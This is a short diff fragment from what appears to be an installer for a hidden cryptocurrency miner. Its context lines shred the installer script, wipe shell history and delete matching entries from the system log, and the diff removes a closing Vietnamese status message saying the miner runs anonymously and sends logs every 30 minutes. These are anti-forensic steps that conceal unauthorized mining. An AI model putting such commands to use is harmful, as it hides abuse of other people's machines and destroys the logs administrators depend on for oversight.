@@ -66,4 +66,3 @@ shred -u $INSTALL_DIR/logminer.sh 2>/dev/null
 history -c && history -w
 sudo sed -i "/$CUSTOM_NAME/d" /var/log/syslog 2>/dev/null
 
-echo "✅ Miner đang chạy ẩn danh, log gửi mỗi 30 phút! 🚀"
